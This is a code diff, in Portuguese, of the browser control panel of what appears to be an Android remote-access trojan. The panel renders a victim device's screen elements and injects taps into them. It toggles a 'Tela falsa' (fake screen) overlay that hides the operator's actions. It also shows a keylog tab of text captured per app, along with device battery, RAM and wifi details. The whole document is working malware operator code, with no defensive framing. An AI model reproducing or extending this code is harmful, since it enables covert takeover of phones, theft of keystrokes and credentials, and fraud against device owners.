+    if(e.editavel){ ctx.strokeStyle='#4299e1'; ctx.fillStyle='rgba(66,153,225,.1)'; }
+    else if(e.clicavel){ ctx.strokeStyle='#333'; ctx.fillStyle='#f0f0f0'; }
+    else { ctx.strokeStyle='#ccc'; ctx.fillStyle='transparent'; }
+    ctx.lineWidth = e.clicavel||e.editavel ? 1.2 : 0.5;
+    const r = e.clicavel ? 3 : 0;
+    ctx.beginPath(); ctx.roundRect(x,y,w,h,r); ctx.fill(); ctx.stroke();
+    const label = (e.txt||e.desc||'').trim();
+    if(label && h>6) {
+      const fs = Math.min(11, Math.max(7, h*.4));
+      ctx.fillStyle = e.editavel ? '#4299e1' : '#222';
+      ctx.font = `${fs}px system-ui`;
+      ctx.textAlign='center'; ctx.textBaseline='middle';
+      ctx.save(); ctx.beginPath(); ctx.rect(x+2,y,w-4,h); ctx.clip();
+      ctx.fillText(label.substring(0,25), x+w/2, y+h/2);
+      ctx.restore();
+    }
+    if(e.editavel){ ctx.fillStyle='#4299e1'; ctx.fillRect(x+2,y+h-2,w-4,2); }
+  });
+  if(pacote){ ctx.fillStyle='rgba(0,0,0,.4)'; ctx.fillRect(0,0,sw,13); ctx.fillStyle='#fff'; ctx.font='bold 8px system-ui'; ctx.textAlign='center'; ctx.fillText(pacote.split('.').pop(),sw/2,9); }
+  document.getElementById('waiting').style.display = 'none';
 }
 
 function limparCanvas() {
-  const canvas = document.getElementById('wf-canvas');
+  const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
   ctx.fillStyle = '#0a0a0a';
   ctx.fillRect(0, 0, canvas.width, canvas.height);
+  document.getElementById('waiting').style.display = 'flex';
 }
 
 // ── Toque ─────────────────────────────────────────────────────────────────
 
-function handleToque(e) {
-  const wrap = document.getElementById('device-wrap');
-  const r = wrap.getBoundingClientRect();
-  const xPct = Math.max(0, Math.min(100, (e.clientX - r.left)  / r.width  * 100));
-  const yPct = Math.max(0, Math.min(100, (e.clientY - r.top)   / r.height * 100));
+document.getElementById('device').addEventListener('click', (e) => {
+  const r = e.currentTarget.getBoundingClientRect();
+  const xPct = Math.max(0, Math.min(100, (e.clientX-r.left)/r.width*100));
+  const yPct = Math.max(0, Math.min(100, (e.clientY-r.top)/r.height*100));
   send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dw, altura:dh});
   log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
-}
-
-
-function enviarTexto() {
-  const val = document.getElementById('input-texto-remoto').value;
-  if (!val) return;
-  send({tipo:'cmd', cmd:'texto', valor: val});
-  log(`→ texto: ${val}`, 'ev');
-  fecharModal();
-}
+});
 
 // ── Overlay ───────────────────────────────────────────────────────────────
 
 function toggleOverlay() {
   overlayAtivo = !overlayAtivo;
   send({tipo:'cmd', cmd: overlayAtivo ? 'overlay_on' : 'overlay_off'});
-  const btnN = document.getElementById('btn-overlay-n');
-  const btnS = document.getElementById('btn-overlay-s');
-  if (overlayAtivo) {
-    btnN.className = 'nav-btn active-overlay';
-    btnN.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Remover</span>';
-    btnS.className = 'ctrl active-overlay';
-    btnS.innerHTML = '<i class="ti ti-device-mobile-pause"></i> Remover tela';
-    log('→ Tela falsa ON', 'warn');
+  const bn = document.getElementById('btn-overlay-n');
+  const bs = document.getElementById('btn-overlay-s');
+  if(overlayAtivo) {
+    bn.className='nav-btn overlay-on'; bn.innerHTML='<i class="ti ti-device-mobile-pause"></i><span>Remover</span>';
+    bs.className='ctrl overlay-on'; bs.innerHTML='<i class="ti ti-device-mobile-pause"></i> Remover tela';
+    log('→ Tela falsa ON','warn');
   } else {
-    btnN.className = 'nav-btn purple';
-    btnN.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
-    btnS.className = 'ctrl purple';
-    btnS.innerHTML = '<i class="ti ti-device-mobile-pause"></i> Tela falsa';
-    log('→ Tela falsa OFF', 'ev');
+    bn.className='nav-btn purple'; bn.innerHTML='<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
+    bs.className='ctrl purple'; bs.innerHTML='<i class="ti ti-device-mobile-pause"></i> Tela falsa';
+    log('→ Tela falsa OFF','ev');
+  }
+}
+
+// ── Info ──────────────────────────────────────────────────────────────────
+
+function atualizarInfo(info) {
+  if(!info) return;
+  document.getElementById('d-model').textContent = info.modelo||'—';
+  document.getElementById('d-os').textContent    = info.android||'—';
+  document.getElementById('d-bat').textContent   = info.bateria||'—';
+  document.getElementById('d-ram').textContent   = info.ram||'—';
+  document.getElementById('d-wifi').textContent  = info.wifi||'—';
+  if(info.largura && info.altura) {
+    dw = parseInt(info.largura);
+    dh = parseInt(info.altura);
+    document.getElementById('d-res').textContent = `${dw}×${dh}`;
+    tamanhoCanvas();
   }
 }
 
@@ -456,90 +392,44 @@ function toggleOverlay() {
 
 function enviarMsg() {
   const v = document.getElementById('msg-input').value.trim();
-  if (!v) return;
-  send({tipo:'mensagem', texto: v});
+  if(!v) return;
+  send({tipo:'mensagem', texto:v});
   log(`→ msg: ${v}`, 'ev');
   document.getElementById('msg-input').value = '';
-}
-
-// ── Info dispositivo ──────────────────────────────────────────────────────
-
-function atualizarInfo(info) {
-  if (!info) return;
-  document.getElementById('d-bat').textContent   = info.bateria || '—';
-  document.getElementById('d-ram').textContent   = info.ram     || '—';
-  document.getElementById('d-wifi').textContent  = info.wifi    || '—';
-  document.getElementById('d-os').textContent    = info.android || '—';
-  document.getElementById('d-model').textContent = info.modelo  || '—';
-  if (info.largura && info.altura) {
-    dw = parseInt(info.largura);
-    dh = parseInt(info.altura);
-    document.getElementById('d-res').textContent = `${dw}×${dh}`;
-    redimensionar();
-  }
-}
-
-function redimensionar() {
-  const wrap = document.getElementById('device-wrap');
-  const h = Math.round(VISOR_W * dh / dw);
-  wrap.style.width  = VISOR_W + 'px';
-  wrap.style.height = h + 'px';
-}
-
-// ── Clientes ──────────────────────────────────────────────────────────────
-
-function renderClientes(clientes) {
-  const el = document.getElementById('lista-clientes');
-  if (!clientes || !clientes.length) {
-    el.innerHTML = '<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>';
-    return;
-  }
-  el.innerHTML = clientes.map(c => `
-    <div class="cliente-card">
-      <div class="cliente-info">
-        <strong>${c.info?.modelo || 'Dispositivo'}</strong><br>
-        ${c.info?.android||''} | Bat: ${c.info?.bateria||'—'} | ${c.info?.wifi||'—'}
-        ${c.emAtendimento ? ' <span style="color:#68d391">● Atendimento</span>' : ''}
-      </div>
-      <button class="btn-atender" onclick="send({tipo:'conectar_cliente',deviceToken:'${c.deviceToken}'})">
-        <i class="ti ti-headset"></i> Atender
-      </button>
-    </div>
-  `).join('');
 }
 
 // ── Log ───────────────────────────────────────────────────────────────────
 
 function aba(a) {
   abaAtual = a;
-  document.getElementById('painel-log').style.display = a==='log' ? 'block' : 'none';
-  document.getElementById('painel-key').style.display = a==='key' ? 'block' : 'none';
-  document.getElementById('tab-log').className = 'tab' + (a==='log' ? ' active' : '');
-  document.getElementById('tab-key').className = 'tab' + (a==='key' ? ' active' : '');
-  if (a==='key') document.getElementById('key-badge').style.display = 'none';
+  document.getElementById('painel-log').style.display = a==='log'?'block':'none';
+  document.getElementById('painel-key').style.display = a==='key'?'block':'none';
+  document.getElementById('tab-log').className = 'tab'+(a==='log'?' active':'');
+  document.getElementById('tab-key').className = 'tab'+(a==='key'?' active':'');
+  if(a==='key') document.getElementById('key-badge').style.display='none';
 }
 
 function log(msg, tipo='') {
   const el = document.getElementById('painel-log');
-  const d  = document.createElement('div');
-  d.className = 'log-entry ' + tipo;
+  const d = document.createElement('div');
+  d.className = 'log-entry '+tipo;
   d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
   el.prepend(d);
 }
 
 function logKey(texto, app) {
   const el = document.getElementById('painel-key');
-  const d  = document.createElement('div');
+  const d = document.createElement('div');
   d.className = 'keylog-entry';
   d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
   el.prepend(d);
-  if (abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
+  if(abaAtual!=='key') document.getElementById('key-badge').style.display='inline';
 }
 
-function setStatus(online) {
-  const b = document.getElementById('status-badge');
-  b.className = 'status ' + (online ? 'online' : 'offline');
-  b.innerHTML = `<span class="dot"></span> ${online ? 'Conectado' : 'Desconectado'}`;
+function setBadge(on) {
+  const b = document.getElementById('badge');
+  b.className = 'badge '+(on?'on':'off');
+  b.innerHTML = `<span class="dot"></span> ${on?'Conectado':'Desconectado'}`;
 }
 </script>
 </body>
